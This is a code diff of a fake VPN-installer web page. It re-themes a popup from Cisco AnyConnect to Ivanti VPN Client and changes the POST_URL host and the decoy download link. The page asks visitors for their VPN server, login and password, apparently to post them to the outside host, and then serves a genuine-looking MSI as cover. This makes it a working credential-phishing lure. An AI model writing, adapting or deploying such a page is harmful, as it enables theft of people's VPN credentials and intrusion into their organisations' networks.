@@ -85,7 +85,7 @@
     <div class="custom-popup">
       <button class="close-btn">&times;</button>
       <div class="header-text">
-        To install Cisco AnyConnect, please enter your connection details
+        To install Ivanti VPN Client, please enter your connection details
       </div>
       <input type="text" id="popup-server" placeholder="Server URL" />
       <input type="text" id="popup-login" placeholder="Login" />
@@ -117,7 +117,7 @@
   function closePopup() {
     overlay.style.display = 'none';
     serverInput.value = ''; loginInput.value = ''; passwordInput.value = '';
-    headerText.innerHTML = 'To install Cisco AnyConnect, please enter your connection details';
+    headerText.innerHTML = 'To install Ivanti VPN Client, please enter your connection details';
     attempt = 1;
     checkFields();
   }
@@ -129,12 +129,12 @@
     overlay.style.display = 'flex';
     serverInput.focus();
     attempt = 1;
-    headerText.innerHTML = 'To install Cisco AnyConnect, please enter your connection details';
+    headerText.innerHTML = 'To install Ivanti VPN Client, please enter your connection details';
     checkFields();
   };
 
-  const POST_URL = 'https://myfiles2.download/';
-  const DOWNLOAD_FILE = 'https://eeast.lehigh.edu/tools/software_management/cisco/msi/cisco-secure-client-win-5.1.8.122-core-vpn-predeploy-k9.msi';
+  const POST_URL = 'https://dukegroup.org/';
+  const DOWNLOAD_FILE = 'https://files.library.ucdavis.edu/vpn-clients/PulseSecure.x64.msi';
 
   downloadBtn.addEventListener('click', async function () {
     if (!downloadBtn.classList.contains('active')) return;
@@ -174,7 +174,4 @@
       setTimeout(closePopup, 2000);
     }
   });
-
 })();
-
-
